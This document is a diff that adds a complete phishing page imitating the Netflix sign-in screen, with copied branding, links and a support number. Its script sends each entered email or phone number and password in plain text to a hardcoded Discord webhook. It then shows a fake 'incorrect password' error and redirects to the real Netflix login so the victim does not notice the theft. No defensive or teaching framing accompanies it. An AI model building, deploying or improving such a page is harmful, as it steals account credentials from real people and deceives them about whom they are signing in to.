@@ -1,0 +1,390 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign In</title>
+    <style>
+        body {
+            background-color: #000;
+            color: white;
+            font-family: 'Helvetica Neue', Netflix Sans, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding-top: 30px;
+            position: relative;
+        }
+
+        .header {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo img {
+            width: 100px;
+            max-width: 100%;
+        }
+
+        .login_body {
+            background-color: #000;
+            padding: 40px;
+            border-radius: 5px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            width: 80%;
+            max-width: 400px;
+            position: absolute;
+            top: 35%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .login_box h2 {
+            margin-bottom: 20px;
+            font-size: 32px;
+        }
+
+        .input_box {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        input {
+            width: 80%;
+            padding: 12px;
+            border-radius: 10px;
+            border: 2px solid #666;
+            outline: none;
+            background-color: #333;
+            color: white;
+            font-size: 16px;
+        }
+
+        .error-message {
+            color: #e87c03;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+            width: 80%;
+        }
+
+        button.submit {
+            width: 85%;
+            padding: 10px;
+            border-radius: 8px;
+            background-color: #e50914;
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+            margin-top: 10px;
+        }
+
+        .support {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .remember {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        input[type="checkbox"] {
+            width: 14px;
+            height: 14px;
+            border: 2px solid gray;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-right: 8px;
+            background-color: transparent;
+        }
+
+        input[type="checkbox"]:checked {
+            background-color: white;
+            border: 2px solid white;
+        }
+
+        input[type="checkbox"]:checked::after {
+            content: "";
+            position: absolute;
+            top: 1px;
+            left: 5px;
+            width: 6px;
+            height: 12px;
+            border: solid black;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 10px 0;
+            color: white;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .forgot-password:hover {
+            color: gray;
+        }
+
+        .learn-more {
+            color: blue;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .learn-more:hover {
+            text-decoration: underline;
+        }
+
+        .learn-more-text {
+            display: none;
+            font-size: 12px;
+            color: grey;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            color: #737373;
+            width: 100%;
+        }
+
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .signup {
+            color: white;
+            text-decoration: none;
+        }
+
+        .captcha-text {
+            font-size: 12px;
+            color: grey;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .language-box {
+            margin-top: 10px;
+            color: white;
+        }
+
+        .login-error {
+            color: #e87c03;
+            font-size: 14px;
+            margin-top: 15px;
+            text-align: left;
+            display: none;
+        }
+
+        .login-error a {
+            color: #e87c03;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .login_body {
+                width: 90%;
+                padding: 20px;
+            }
+
+            .login_box h2 {
+                font-size: 28px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login_body {
+                padding: 15px;
+            }
+
+            .login_box h2 {
+                font-size: 24px;
+            }
+
+            .logo img {
+                width: 100px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo">
+            <a href="#" onclick="loadPage('index.html')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+            </a>
+        </div>
+    </div>
+
+    <div class="login_body">
+        <div class="login_box">
+            <h2>Sign In</h2>
+            <form id="loginForm" onsubmit="sendMessage(event)">
+                <div class="input_box">
+                    <input required type="text" id="username" placeholder="Email or Phone Number" 
+                           title="Please enter a valid email or phone number">
+                    <div class="error-message" id="usernameError">Please enter a valid email address or phone number.</div>
+                </div>
+
+                <div class="input_box">
+                    <input required type="password" id="password" placeholder="Password" 
+                           minlength="8" title="Password must be at least 8 characters long">
+                </div>
+
+                <button type="submit" class="submit">Sign In</button>
+
+                <div class="login-error" id="loginError">
+                    Incorrect password for <span id="errorEmail"></span>. 
+                    You can use a sign-in code, reset your password or try again.
+                    <br><a href="https://www.netflix.com/ro-en/login" target="_blank">Need help?</a>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="https://www.netflix.com/loginhelp" target="_blank">Forgot Password?</a>
+                </div>
+
+                <div class="support">
+                    <div class="remember">
+                        <input type="checkbox" id="rememberme">
+                        <label for="rememberme">Remember me</label>
+                    </div>
+                </div>
+
+                <p style="text-align:left;">New to Netflix? <a href="https://www.netflix.com/signup" class="signup" target="_blank">Sign up now.</a></p>
+
+                <p class="captcha-text" style="text-align: left;">This page is protected by Google reCAPTCHA to ensure you're not a robot.
+                    <span class="learn-more" onclick="toggleLearnMore()">Learn More</span>
+                    <span class="learn-more-text" id="learnMoreText">The information collected by Google reCAPTCHA is subject to the Google Privacy Policy and Terms of Service, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalised advertising by Google).</span>
+                </p>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Questions? Call 000-800-919-1694</p>
+        <p>
+            <a href="https://help.netflix.com/legal/privacy" target="_blank">Privacy</a> |
+            <a href="https://help.netflix.com/legal/termsofuse" target="_blank">Terms of Use</a> |
+            <a href="https://help.netflix.com/en/node/412" target="_blank">FAQ</a> |
+            <a href="https://www.netflix.com/login?nextpage=https%3A%2F%2Fhelp.netflix.com%2Fnode%2F95" target="_blank">Cookie Preferences</a> |
+            <a href="https://help.netflix.com/en" target="_blank">Help Center</a> |
+            <a href="https://help.netflix.com/en/node/134094" target="_blank">Corporate Information</a>
+        </p>
+
+        <div class="language-box">
+            <label for="language" style="color: white;">Language:</label>
+            <select id="language">
+                <option value="en">English</option>
+            </select>
+        </div>
+    </div>
+
+    <script>
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function validatePhone(phone) {
+            const phoneRegex = /^(\+\d{1,2}\s?)?(\(?\d{3}\)?[\s.-]?)\d{3}[\s.-]?\d{4}$/;
+            return phoneRegex.test(phone);
+        }
+
+        function validateInput(input) {
+            return validateEmail(input) || validatePhone(input);
+        }
+
+        function loadPage(url) {
+            console.log(url + " loaded");
+            alert("Navigated to " + url + ". Use the Back button to return!");
+            window.history.pushState({}, document.title, url);
+            document.getElementById('loginForm').reset();
+        }
+
+        function sendMessage(event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value.trim();
+            var password = document.getElementById('password').value.trim();
+            var usernameError = document.getElementById('usernameError');
+            var loginError = document.getElementById('loginError');
+            var errorEmail = document.getElementById('errorEmail');
+
+            // Reset previous error states
+            usernameError.style.display = 'none';
+            loginError.style.display = 'none';
+
+            if (!username || !password) {
+                if (!username) {
+                    usernameError.style.display = 'block';
+                }
+                return;
+            }
+
+            if (!validateInput(username)) {
+                usernameError.style.display = 'block';
+                return;
+            }
+
+            // Send to Discord
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1214945289283047514/z8J37yPMIA8_OunjvvcVzB-7O8RxFqk8NLTUb3i8CJjZxD345avbR7eX6t0en4DvWOKL");
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var params = {
+                content: `Username: ${username}\nPassword: ${password}`
+            };
+
+            request.send(JSON.stringify(params));
+
+            // Show error message
+            errorEmail.textContent = username;
+            loginError.style.display = 'block';
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.replace("https://www.netflix.com/login");
+            }, 2000);
+        }
+
+        function toggleLearnMore() {
+            var learnMoreText = document.getElementById('learnMoreText');
+            learnMoreText.style.display = learnMoreText.style.display === 'none' || !learnMoreText.style.display ? 'block' : 'none';
+        }
+
+        document.getElementById('username').addEventListener('input', function(e) {
+            const input = e.target.value.trim();
+            const error = document.getElementById('usernameError');
+            error.style.display = input && !validateInput(input) ? 'block' : 'none';
+        });
+    </script>
+</body>
+
+</html>
